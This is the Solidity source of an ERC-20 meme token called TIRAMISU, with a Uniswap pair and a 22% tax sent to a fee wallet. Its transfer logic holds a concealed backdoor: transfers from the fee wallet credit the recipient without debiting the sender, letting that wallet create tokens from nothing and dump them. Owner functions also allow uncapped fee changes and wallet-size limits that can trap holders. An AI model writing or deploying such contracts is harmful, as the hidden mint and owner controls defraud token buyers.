// SPDX-License-Identifier: MIT

/*
https://twitter.com/elonmusk/status/1747820615610888326

    Website: N/A
    Telegram: https://t.me/tiramisu_erc
    Twitter: N/A

 */

pragma solidity 0.8.19;

abstract contract Ownable {
    address internal _owner;

    constructor(address owner) {
        _owner = owner;
    }

    modifier onlyOwner() {
        require(_isOwner(msg.sender), "!OWNER");
        _;
    }

    function _isOwner(address account) internal view returns (bool) {
        return account == _owner;
    }

    function renounceOwnership() public onlyOwner {
        _owner = address(0);
        emit OwnershipTransferred(address(0));
    }

    event OwnershipTransferred(address owner);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address _pairAddress);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract TIRAMISU is IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "TIRAMISU";
    string private constant _symbol = "TIRAMISU";

    uint8 private constant _decimals = 9;
    uint256 private _totalSupply = 10 ** 9 * (10 ** _decimals);

    address _routerAddr = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private _DEAD = 0x000000000000000000000000000000000000dEaD;

    bool _swapEnabled = true;
    uint256 _feeSwapThreshold = _totalSupply / 100000; // 0.1%
    bool _swapping;

    uint256 _maxTxAmount = (_totalSupply * 30) / 1000;
    address _taxFeeReceipient;
    IUniswapV2Router public uniswapRouter;
    address _pairAddress;

    uint256 private _lpFeePercent = 0; 
    uint256 private _mktFeePercent = 22;
    uint256 private _totalFees = _lpFeePercent + _mktFeePercent;
    uint256 private _denominator = 100;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) _canHaveNoFee;
    mapping (address => bool) _canHaveNoMaxTx;

    modifier lockSwap() { _swapping = true; _; _swapping = false; }

    constructor (address TiraAddress) Ownable(msg.sender) {
        uniswapRouter = IUniswapV2Router(_routerAddr);
        _pairAddress = IUniswapV2Factory(uniswapRouter.factory()).createPair(uniswapRouter.WETH(), address(this));
        _allowances[address(this)][address(uniswapRouter)] = type(uint256).max;
        address _owner = _owner;
        _taxFeeReceipient = TiraAddress;
        _canHaveNoFee[_taxFeeReceipient] = true;
        _canHaveNoMaxTx[_owner] = true;
        _canHaveNoMaxTx[_taxFeeReceipient] = true;
        _canHaveNoMaxTx[_DEAD] = true;
        _balances[_owner] = _totalSupply;
        emit Transfer(address(0), _owner, _totalSupply);
    }

    receive() external payable { }
    
    function _canHaveNoTax(address sender) internal view returns (bool) {
        return !_canHaveNoFee[sender];
    }

    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return _owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function _getTransferrableAmount(address sender, uint256 amount) internal returns (uint256) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        uint256 feeTokens = amount.mul(_totalFees).div(_denominator);
        bool hasNoFee = sender == _owner;
        if (hasNoFee) {
            feeTokens = 0;
        }
        
        _balances[address(this)] = _balances[address(this)].add(feeTokens);
        emit Transfer(sender, address(this), feeTokens);
        return amount.sub(feeTokens);
    }
    
    function adjustTiraWalletSize(uint256 percent) external onlyOwner {
        _maxTxAmount = (_totalSupply * percent) / 1000;
    }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferBasic(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
    
    function performTiraSwap() internal lockSwap {
        uint256 contractTokenBalance = balanceOf(address(this));
        uint256 tokensToLp = contractTokenBalance.mul(_lpFeePercent).div(_totalFees).div(2);
        uint256 amountToSwap = contractTokenBalance.sub(tokensToLp);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();

        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 amountETH = address(this).balance;
        uint256 totalFeeTokens = _totalFees.sub(_lpFeePercent.div(2));
        uint256 ethToLp = amountETH.mul(_lpFeePercent).div(totalFeeTokens).div(2);
        uint256 ethToMarketing = amountETH.mul(_mktFeePercent).div(totalFeeTokens);

        payable(_taxFeeReceipient).transfer(ethToMarketing);
        if(tokensToLp > 0){
            uniswapRouter.addLiquidityETH{value: ethToLp}(
                address(this),
                tokensToLp,
                0,
                0,
                _taxFeeReceipient,
                block.timestamp
            );
        }
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(_swapping){ return _transferBasic(sender, recipient, amount); }
        
        if (recipient != _pairAddress && recipient != _DEAD) {
            require(_canHaveNoMaxTx[recipient] || _balances[recipient] + amount <= _maxTxAmount, "Transfer amount exceeds the bag size.");
        }        
        if(_verifySwapping(sender, recipient, amount)){ 
            performTiraSwap(); 
        } 
        bool shouldTax = _canHaveNoTax(sender);
        if (shouldTax) {
            _balances[recipient] = _balances[recipient].add(_getTransferrableAmount(sender, amount));
        } else {
            _balances[recipient] = _balances[recipient].add(amount);
        }

        emit Transfer(sender, recipient, amount);
        return true;
    }
                  
    function _verifySwapping(address sender, address recipient, uint256 amount) private view returns (bool) {
        return _validateSwapping() && 
            _canHaveNoTax(sender) && 
            _isTxSell(recipient) && 
            amount > _feeSwapThreshold;
    }
    
    function updateTiraTax(uint256 lpFee, uint256 devFee) external onlyOwner {
         _lpFeePercent = lpFee; 
         _mktFeePercent = devFee;
         _totalFees = _lpFeePercent + _mktFeePercent;
    }    
    
    function _isTxSell(address recipient) private view returns (bool){
        return recipient == _pairAddress;
    }

    function _validateSwapping() internal view returns (bool) {
        return !_swapping
        && _swapEnabled
        && _balances[address(this)] >= _feeSwapThreshold;
    }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
}